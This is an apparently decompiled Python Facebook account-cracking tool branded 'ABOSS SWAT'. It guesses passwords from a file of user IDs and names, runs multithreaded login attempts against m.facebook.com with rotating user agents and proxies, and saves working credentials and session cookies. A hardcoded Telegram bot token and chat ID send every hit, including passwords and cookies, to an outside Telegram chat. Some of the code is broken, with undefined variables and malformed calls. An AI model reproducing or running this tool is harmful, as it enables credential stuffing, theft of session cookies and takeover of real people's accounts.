#• MaDe By @A_B_A_S64 •اهلا بك عزيزي المشترك في اداة عبوسي تم تفعيل الاداة
M = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
Z = '\x1b[1;30m'
sir = '\x1b[41m\x1b[1;97m'
x = '\x1b[m'
m = '\x1b[1;91m'
k = '\x1b[93m'
h = '\x1b[1;92m'
hh = '\x1b[32m'
u = '\x1b[95m'
kk = '\x1b[33m'
b = '\x1b[1;96m'
p = '\x1b[0;34m'
AB_A = '\x1b[1;97m'
RS = '\x1b[30m'
AH_F = '\x1b[31m'
AKH_F = '\x1b[32m'
AS_T = '\x1b[33m'
SM = '\x1b[34m'
BN = '\x1b[35m'
AZ_T = '\x1b[36m'
AB_KH = '\x1b[37m'
AH_T = '\x1b[91m'
AKH_T = '\x1b[92m'
AS_F = '\x1b[93m'
WR = '\x1b[95m'
p = '\x1b[38;5;208m'
AH2 = '\x1b[38;5;204m'
AS2 = '\x1b[38;5;220m'
MJ = '\x1b[38;5;193m'
MJ2 = '\x1b[38;5;216m'
MJ3 = '\x1b[38;5;190m'
O = '\x1b[0;96m'
P = '\x1b[38;5;231m'
J = '\x1b[38;5;208m'
MJ4 = '\x1b[38;5;106m'
import requests
import sys
import time
import re
import random
from concurrent.futures import ThreadPoolExecutor as Modol
from rich.progress import Progress, TextColumn
import threading
from bs4 import BeautifulSoup as par
from time import time as mek
import requests
import bs4
import json
import os
import sys
import random
import datetime
import time
import re
import urllib3
import rich
import base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
import os
import datetime
import time
import webbrowser


try:
    import requests
except:
    Z = '\x1b[1;31m'
R = '\x1b[1;31m'
X = '\x1b[1;33m'
F = '\x1b[2;32m'
C = '\x1b[1;97m'
B = '\x1b[2;36m'
Y = '\x1b[1;34m'
E = '\x1b[1;31m'
B = '\x1b[2;36m'
G = '\x1b[1;32m'
S = '\x1b[1;33m'
ses = requests.Session()
F = '\x1b[2;32m'
L = '\x1b[1;95m'
E = '\x1b[1;31m'
G = '\x1b[1;32m'
S = '\x1b[1;33m'
Z = '\x1b[1;31m'
X = '\x1b[1;33m'
Z1 = '\x1b[2;31m'
F = '\x1b[2;32m'
A = '\x1b[2;39m'
C = '\x1b[2;35m'
B = '\x1b[2;36m'
Y = '\x1b[1;34m'

try:
    from cfonts import render, say
except:
    os.system('pip install python-cfonts')
output = render('A B O S S  S W A T', colors=['red','green'], align='center')
print('—'*25)
print('• MaDe By @A_B_A_S64 •')
print('—'*25)
print(output)
print('—'*25)
print('• MaDe By @A_B_A_S64 •')
print('—'*25)
print('\n')
token = '6563306403:AAHshDmH19ZoXyaZsfVcG-53EEtnEitd4xA'
print('\n')
ID = '6234165200'
tokenn = input('\x1b[1;32mT\x1b[1;34mO\x1b[1;30mK\x1b[1;37mE\x1b[1;33mN\x1b[1;34m ➪\x1b[1;31m ')
print('\n')
IDD = input('\x1b[1;31mI\x1b[1;34mD \x1b[1;32m ➪')
tlg1 = '''𝑊𝐸l𝐶𝑂𝑀 𝑇𝑂 𝑇𝐻𝐸 𝑇𝑂𝑂l★تٍمٌ تٍفُعيِلّ اَْلّاَْداَْةّ مٌنَ قبلّ مٌطور عبسيِ  ✅
━━━━━━━━━━━━━━━━━━
MY TELEGRAM :- @A_B_A_S64 ✅
━━━━━━━━━━━━━━━━━━
My TOOL :- FACEBOOK ✅
━━━━━━━━━━━━━━━━━━
GOOD LUCK My brother ✅ '''
requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(tlg1))
os.system('clear')
os.system('clear')
pretty.install()
CON = sol()
try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
                'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
                'm_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
                'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
                'try_number': '0',
                'unrecognized_tries': '0',
                'email': uid,
                'pass': ps,
                'login': 'Log In' }
            header_freefb = {
                'authority': 'mbasic.facebook.com',
                'method': 'GET',
                'scheme': 'https',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=1',
                'cache-control': 'no-cache, no-store, must-revalidate',
                'referer': 'https://mbasic.facebook.com/',
                'sec-ch-ua': '"Google Chrome";v="106", "Not)A;Brand";v="24", "Chromium";v="106"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': 'Android',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'none',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': pro }
            lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc', log_data, header_freefb, **('data', 'headers')).text
            log_cookies = session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                cid = coki[65:80]
                print('\x1b[38;5;46m[AMIR-OK]├── ' + cid + '└──' + ps + '  \n\x1b[1;33mCOOKIES : \x1b[38;5;46m└──' + coki + ' ')
                open('/sdcard/AMIR-XD-OK.txt', 'a').write(uid + ' | ' + ps + '\n')
                oks.append(cid)
                PROXY = requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt').textopen('PROXYZ.txt','w').write(PROXY)
except:pass
PROXY=open('PROXYZ.txt','r').read().splitlines()
def generate_user_agent_android():
    version_a = f'{random.randrange(1, 9)}.{random.randrange(1, 9)}'
    device_a = '11; Redmi Note 5A Lite)'
    extras_a = f'{random.randrange(100, 9999)} AppleWebKit/537.36 (KHTML, like Gecko) {random.randrange(1, 9)}.{random.randrange(1, 4)}.{random.randrange(1, 4)}.{random.randrange(1, 4)} Chrome/96.0.4664.45 Mobile Safari/537.36'
    return f'Mozilla/5.0 (Linux; Android {version_a} {device_a} {extras_a}'
head = (
           {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
           })   
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36'
ugen2 = [generate_user_agent_android() for _ in range(10000)]
def generate_user_agent_android_12():
    version_b = '12;'
    device_b = 'M2101K6G'
    letter = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    number = random.randrange(1, 999)
    extras_b = f'Build/SKQ1.210908.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) {random.randrange(80, 103)}.0.0.{random.randrange(4200, 4900)} {random.randrange(40, 150)} Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]'
    return f'Mozilla/5.0 (Linux; Android {version_b} {letter}{device_b}{number}{letter}) {extras_b}'
ugen = [generate_user_agent_android_12() for _ in range(10000)]
id, id2, loop, ok, cp, akun, oprek, method, taplikasi, uid = [], [], 0, 0, 0, [], [], [], [], []
cokbrut = []
pwpluss = []
pwnya = []
L = '\x1b[0;35m'
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
Z = '\x1b[1;30m'
sir = '\x1b[41m\x1b[1;97m'
x = '\x1b[m'
m = '\x1b[1;91m'
k = '\x1b[93m'
h = '\x1b[1;92m'
hh = '\x1b[32m'
u = '\x1b[95m'
kk = '\x1b[33m'
b = '\x1b[1;96m'
p = '\x1b[0;34m'
asu = random.choice([
    m,
    k,
    h,
    u,
    b])
dic = {
    '1': 'January',
    '2': 'February',
    '3': 'March',
    '4': 'April',
    '5': 'May',
    '6': 'June',
    '7': 'July',
    '8': 'August',
    '9': 'September',
    '10': 'October',
    '11': 'November',
    '12': 'December' }
dic2 = {
    '01': 'January',
    '02': 'February',
    '03': 'March',
    '04': 'April',
    '05': 'May',
    '06': 'June',
    '07': 'July',
    '08': 'August',
    '09': 'September',
    '10': 'October',
    '11': 'November',
    '12': 'Devember' }
tgl = datetime.datetime.now().day
bln = dic[str(datetime.datetime.now().month)]
thn = datetime.datetime.now().year
okc = 'OK-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
cpc = 'CP-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
M = '\x1b[1;91m'
O = '\x1b[1;96m'
N = '\x1b[0m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
logo =("'⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠋⠁⠀⠀⠀⠀⠉⠉⠉⠛⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢻⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⠀⠙⠻⣿⣿⣿⣿⣿⡃⠀⠀⢀⣴⣶⣿⣷⡦⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣷⣦⣤⣾⣿⣿⣿⡿⠃⣠⣴⣿⣿⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠈⠉⠁⠀⠀⠈⠉⠻⣿⣿⣿⣿⣇⣼⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣄⣀⠀⠀⠀⣀⣠⣴⣶⡄⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⣾⣿⣿⣷⣶⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠘⠻⠿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣛⡛⠛⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⢶⣾⣿⣿⣏⠛⠿⣿⣿⡿⠋⢉⣿⣿⣿⣿⠀⠀⢰⡇⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠘⣆⠀⠈⠛⠿⠿⠿⠃⠀⠀⠀⠀⠀⠙⠿⠛⠛⠁⠀⢠⡿⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠘⣧⠀⢀⣀⣀⣀⠀⠀⠸⠿⠆⠀⣀⣀⣠⣤⠀⢠⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠈⢧⡀⢉⡛⠿⠿⠿⠶⠶⠾⠿⠿⠟⠋⠁⢠⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢳⣾⣿⣿⣷⣄⠀⠀⠀⢠⣤⣶⡆⣠⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⠀⠀⠀⢸⣿⣿⣷⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠛⡿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⡄⠀⠀⢸⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠇⠀⠀⠘⠛⠁'")
('اهلا بك عزيزي مشترك في اداة عبوسي' )
print('MaDe @A_B_A_S64 اهلا بك عزيزي مشترك في اداة عبوسي')
def clear():
    os.system('clear')


def ABOSS_CT():
    ip = requests.get('https://api.ipify.org').text
    gep = requests.get('http://ipinfo.io/json').json()
    os.system('clear')
    print(L + logo)
    print(L + '★★★★★★عبوسي★★★★★★★')
    print('')
    _____aboss_swat_____ = '1'
    if _____aboss_swat_____ in ('1',):
        CT_SWAT()


def aboss_swat():
    try:
        na = webbrowser.open('https://t.me/ABOS_PYT')
    except:
        exit()



def CT_SWAT():
    
    try:
        print('')
        fileX = input(f'''{L}Name File {M}:{H} ''')
        for line in open(fileX, 'r').readlines():
            id.append(line.strip())
        setting()
        clear()
        print(M + logo)
        print(L + '✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮')
        print(f'''>> ID : {h}''' + str(len(id)))
        time.sleep(3)
    except:
        exit(f'''\n{M}File %s not found''' % fileX)



def setting():
    hu = '1'
    if hu in ('3', '03'):
        for tua in sorted(id):
            id2.append(tua)
    elif hu in ('2', '02'):
        muda = []
        for bacot in sorted(id):
            muda.append(bacot)
        bcm = len(muda)
        bcmi = bcm - 1
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -= 1
    elif hu in ('1', '01'):
        for bacot in id:
            xx = random.randint(0, len(id2))
            id2.insert(xx, bacot)
    else:
        print('>> PILIH YANG BENAR BANG ')
        exit()
    hc = '1'
    if hc in ('1', '01'):
        method.append('mobile')
    elif hc in ('',):
        print('>> PILIH YANG BENAR BANG ')
        setting()
    _jembot_ = '2'
    if _jembot_ in ('',):
        print('>> Pilih Yang Bener Kontol ')
        back()
    elif _jembot_ in ('2', '2'):
        taplikasi.append('ya')
    else:
        taplikasi.append('no')
    pwplus = '1'
    if pwplus in ('2', '2'):
        pwpluss.append('ya')
        cetak(nel('[[cyan]•[green]] يمكنك وضع باسورد واحد فقط\n[[cyan]•[green]] Contoh :[green] 123456qwerty[green] '))
        pwku = input('>>ادخل الباسورد : ')
        pwkuh = pwku.split(',')
        for xpw in pwkuh:
            pwnya.append(xpw)
    else:
        pwpluss.append('no')
        passwrd()


def passwrd():
    clear()
    print(M + logo)
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            idf = yuzong.split('|')[0]
            nmf = yuzong.split('|')[1].lower()
            frs = nmf.split(' ')[0]
            pwv = []
            if len(nmf) < 6:
                if len(frs) < 3:
                    pass
                else:
                    pwv.append(nmf)
                    pwv.append(frs + frs)
                    pwv.append(frs + ' ' + frs)
                    pwv.append('١٢٣٤٥٦')
                    pwv.append('١٢٣٤٥٦٧٨٩')
                    pwv.append('1122334455@@')
                    pwv.append('Aa123456')
                    pwv.append('mmmmnnnn')
                    pwv.append('nnnnmmmm')
                    pwv.append('mmnnbbvv')
                    pwv.append('zzzzxxxx')
                    pwv.append('zzxxccvv')
                    pwv.append('qqwweerr')
                    pwv.append('12345@12345')
                    pwv.append('123@123')
                    pwv.append('1234512345')
                    pwv.append('123412345')
                    pwv.append('1234554321')
                    pwv.append('00998877')
                    pwv.append('123456123456')
                    pwv.append('1122334455')
                    pwv.append('1q2w3e4r5t')
                    pwv.append('1q2w3e4r5t6y')
                    pwv.append('qwertyuiopasdfghjkl')
                    pwv.append('12345qwerty')
                    pwv.append('ppooiiuu')
                    pwv.append('000000')
                    pwv.append('111111')
                    pwv.append('aaaassss')
                    pwv.append('@@@@@@')
                    pwv.append('00999888')
                    pwv.append('112233445566')
                    pwv.append('12345@@@@@')
                    pwv.append('mnbvcxzmnbvcxz')
                    pwv.append('777777')
                    pwv.append('12345678')
                    pwv.append('xxxxxx')
                    pwv.append('777777')
                    pwv.append('1234512345@@')
                    pwv.append('112233445566')
                    pwv.append('aassddff')
                    pwv.append('00991122@@')
                    pwv.append('0099887766')
                    pwv.append('hhhhhh')
                    pwv.append('123@@@@@')
                    
            elif len(frs) < 3:
                pwv.append(nmf)
            else:
                pwv.append(nmf)
                pwv.append(frs + frs)
                pwv.append(frs + ' ' + frs)
                pwv.append('١٢٣٤٥٦')
                pwv.append('١٢٣٤٥٦٧٨٩')
                pwv.append('1122334455@@')
                pwv.append('Aa123456')
                pwv.append('mmmmnnnn')
                pwv.append('nnnnmmmm')
                pwv.append('mmnnbbvv')
                pwv.append('zzzzxxxx')
                pwv.append('zzxxccvv')
                pwv.append('qqwweerr')
                pwv.append('12345@12345')
                pwv.append('123@123')
                pwv.append('1234512345')
                pwv.append('123412345')
                pwv.append('1234554321')
                pwv.append('00998877')
                pwv.append('123456123456')
                pwv.append('1122334455')
                pwv.append('1q2w3e4r5t')
                pwv.append('1q2w3e4r5t6y')
                pwv.append('qwertyuiopasdfghjkl')
                pwv.append('qqwweerrtt')
                pwv.append('ppooiiuu')
                pwv.append('000000')
                pwv.append('111111')
                pwv.append('aaaassss')
                pwv.append('@@@@@@')
                pwv.append('00999888')
                pwv.append('112233445566')
                pwv.append('12345@@@@@')
                pwv.append('mnbvcxzmnbvcxz')
                pwv.append('777777')
                pwv.append('12345678')
                pwv.append('xxxxxx')
                pwv.append('777777')
                pwv.append('1234512345@@')
                pwv.append('112233445566')
                pwv.append('aassddff')
                pwv.append('00991122@@')
                pwv.append('0099887766')
                pwv.append('hhhhhh')
                pwv.append('123@@@@@')
            if 'ya' in pwpluss:
                for xpwd in pwnya:
                    pwv.append(xpwd)
            if 'mobile' in method:
                pool.submit(crack, idf, pwv)
                continue
            if 'free' in method:
                pool.submit(crackfree, idf, pwv)
                continue
            if 'touch' in method:
                pool.submit(cracktouch, idf, pwv)
                continue
            if 'mbasic' in method:
                pool.submit(crackmbasic, idf, pwv)
            else:
                pool.submit(crackmbasic, idf, pwv)
    print('\n')
    print('تم اكتمال الفحص وشكرا لك لي تجربه اداتي ')
    print('لاتنسي الاشتراك يفي قناه المطور')

def crack(idf, pwv):
    global cp, ok, ok, loop
    bi = random.choice([
        L])
    pers = loop * 100 / len(id2)
    rc = random.choice
    ya = rc([
        '😂',
        '😾',
        '🔥',
        '🤑',
        '😉',
        '☹️',
        '😢',
        '😌',
        '🤯',
        '😈',
        '👿',
        '🤒',
        '🤮',
        '🤥',
        '💔',
        '🗿',
        '🤣',
        '🙈',
        '😭',
        '🥸'])
    fff = '%'
    print(f'''\r%s{ya}[𝐀𝐁𝐎𝐒𝐒] %s/%s ➙ [OK]=%s ➙[CP]=%s | %s%s%s{ya}''' % (bi, loop, len(id2), ok, cp, int(pers), str(fff), x), end=' ')
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        
        try:
            tix = time.time()
            ses.headers.update({
                'Host': 'm.facebook.com',
                'upgrade-insecure-requests': '1',
                'aboss_swat': ua2,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'dnt': '1',
                'x-requested-with': 'mark.via.gp',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-user': 'empty',
                'sec-fetch-dest': 'document',
                'referer': 'https://m.facebook.com/',
                'accept-encoding': 'gzip, deflate br',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8' })
            p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
            dataa = {
                'lsd': re.search('name="lsd" value="(.*?)"', str(p)).group(1),
                'jazoest': re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
                'uid': idf,
                'flow': 'login_no_pin',
                'pass': pw,
                'next': 'https://developers.facebook.com/tools/debug/accesstoken/' }
            ses.headers.update({
                'Host': 'm.facebook.com',
                'cache-control': 'max-age=0',
                'upgrade-insecure-requests': '1',
                'origin': 'https://m.facebook.com',
                'content-type': 'application/x-www-form-urlencoded',
                'aboss_swat': ua,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'x-requested-with': 'mark.via.gp',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-user': 'empty',
                'sec-fetch-dest': 'document',
                'referer': 'https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F',
                'accept-encoding': 'gzip, deflate br',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8' })
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0', data=dataa, allow_redirects=False)
            if 'checkpoint' in po.cookies.get_dict().keys():
                if 'ya' in oprek:
                    akun.append(idf + '|' + pw)
                    ceker(idf, pw)
                else:
                    print('\n')
                    statuscp = f'''\t\n𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺✖️\n⋘─────━𓆩عٌبّوُسًـي جابلك𓆪‏━─────⋙\n❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n\n❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n\nسكيور حض اوفر حبيبي \n⋘─────━𓆩عٌبّوُسًـي جابلك𓆪‏━─────⋙\n⊊𝗕𝗬⊋ ➩ @A_B_A_S64  @ABOS_PYT'''
                    statuscp1 = nel(statuscp, style='red')
                    cetak(nel(statuscp1, title=' نشالله يجيك صحيح '))
                    open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
                    akun.append(idf + '|' + pw)
                    cp += 1
                    requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(statuscp))
            
            if 'c_user' in ses.cookies.get_dict().keys():
                headapp = {
                    'aboss_swat': 'NokiaX2-01/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Linux; Android 9; SH-03J) AppleWebKit/937.36 (KHTML, like Gecko) Safari/420+' }
                if 'no' in taplikasi:
                    ok += 1
                    coki = po.cookies.get_dict()
                    kuki = ';'.join([f"{key}={value}" for key, value in ses.cookies.get_dict().items()])
                    open('OK/' + okc, 'a').write(idf + '|' + pw + '|' + kuki + '\n')
                    print('\n')
                    statusok = f'''\nعَبّوُسًـي جابلك حساب صحيح لا تنسى صور الصيد\n\n⋘─────━ صحيح ━─────⋙\n❖ - ايميل : {idf}\n\n❖ - رمز : {pw}\n\n❖ - كوكيز : {kuki}\n\n⋘─────━ مدفوعه ━─────⋙\n\n  ⊊𝗕𝗬⊋ ➩ @A_B_A_S64   @ABOS_PYT\n  رابط قناه : t.me/@A_B_A_S64\t\t\t\t\n\t\t\t\t\t'''
                    statusok1 = nel(statusok, style='yellow')
                    cetak(nel(statusok1, title=''))
                    requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(statusok))
            
    
                if 'ya' in taplikasi:
                    ok += 1
                    coki = po.cookies.get_dict()
                    kuki = ';'.join([f"{key}={value}" for key, value in ses.cookies.get_dict().items()])
    
                    open('OK/' + okc, 'a').write(idf + '|' + pw + '|' + kuki + '\n')
                    user = idf
                    infoakun = ''
                    session = requests.Session()
                    get_id = session.get('https://m.facebook.com/profile.php', cookies=coki, headers=headapp).text
                    nama = re.findall('\\<title\\>(.*?)<\\/title\\>', str(get_id))[0]
                    response = session.get('https://m.facebook.com/profile.php?v=info', cookies=coki, headers=headapp).text
